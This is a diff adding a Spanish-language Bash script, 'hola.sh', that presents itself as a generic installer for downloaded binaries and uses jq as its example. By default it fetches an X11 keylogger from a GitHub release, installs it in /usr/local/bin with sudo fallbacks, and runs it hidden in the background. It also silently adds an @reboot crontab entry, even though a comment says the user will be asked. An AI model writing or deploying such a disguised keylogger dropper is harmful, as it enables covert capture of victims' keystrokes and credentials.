@@ -1,0 +1,87 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+usage() {
+  cat <<'EOF'
+Uso: hola.sh <URL> [destino]
+
+Ejemplo:
+  hola.sh https://github.com/stedolan/jq/releases/latest/download/jq-linux64
+Si no se especifica "destino", se instalará en "/usr/local/bin/<nombre_del_archivo>".
+Si no se especifica "URL", se descargará la URL por defecto configurada en el script.
+EOF
+}
+
+DEFAULT_URL="https://github.com/Jrgil20/KeyloggerEducativoParaLinuxX11/releases/download/key/x11_keylogger"
+
+if [ "${1:-}" = "" ]; then
+  echo "No se proporcionó URL. Usando URL por defecto: $DEFAULT_URL"
+  URL="$DEFAULT_URL"
+else
+  URL="$1"
+fi
+DEST="${2:-/usr/local/bin/$(basename "$URL")}"
+
+TMPFILE="$(mktemp)"
+trap 'rm -f "$TMPFILE"' EXIT
+
+echo "Descargando $URL..."
+if command -v curl >/dev/null 2>&1; then
+  curl -fL "$URL" -o "$TMPFILE"
+elif command -v wget >/dev/null 2>&1; then
+  wget -O "$TMPFILE" "$URL"
+else
+  echo "Error: ni curl ni wget están instalados." >&2
+  exit 2
+fi
+
+echo "Moviendo a $DEST (puede pedir contraseña sudo si es necesario)..."
+if mv "$TMPFILE" "$DEST" 2>/dev/null; then
+  :
+else
+  sudo mv "$TMPFILE" "$DEST"
+fi
+
+echo "Aplicando permisos ejecutables..."
+if chmod +x "$DEST" 2>/dev/null; then
+  :
+else
+  sudo chmod +x "$DEST"
+fi
+
+USER_OWNERSHIP="$(id -u):$(id -g)"
+echo "Ajustando propietario a tu usuario ($USER_OWNERSHIP)..."
+if chown "$USER_OWNERSHIP" "$DEST" 2>/dev/null; then
+  :
+else
+  sudo chown "$USER_OWNERSHIP" "$DEST"
+fi
+
+echo "Instalación completada: $DEST"
+
+echo "Ejecutando $DEST en segundo plano..."
+if command -v nohup >/dev/null 2>&1; then
+  nohup "$DEST" >/dev/null 2>&1 &
+  PID=$!
+else
+  "$DEST" >/dev/null 2>&1 &
+  PID=$!
+fi
+if [ -n "${PID:-}" ]; then
+  echo "Proceso iniciado: $PID"
+else
+  echo "Advertencia: no se pudo iniciar $DEST" >&2
+fi
+
+# Preguntar si se desea añadir entrada @reboot al crontab del usuario
+if command -v crontab >/dev/null 2>&1; then
+  CRON_ENTRY="@reboot $DEST >/dev/null 2>&1"
+  if crontab -l 2>/dev/null | grep -F -- "$DEST" >/dev/null 2>&1; then
+    echo "Entrada crontab ya existe. Saltando..."
+  else
+    (crontab -l 2>/dev/null || true; echo "$CRON_ENTRY") | crontab -
+    echo "Entrada @reboot añadida al crontab del usuario."
+  fi
+else
+  echo "Aviso: 'crontab' no está disponible, no se pudo añadir @reboot." >&2
+fi
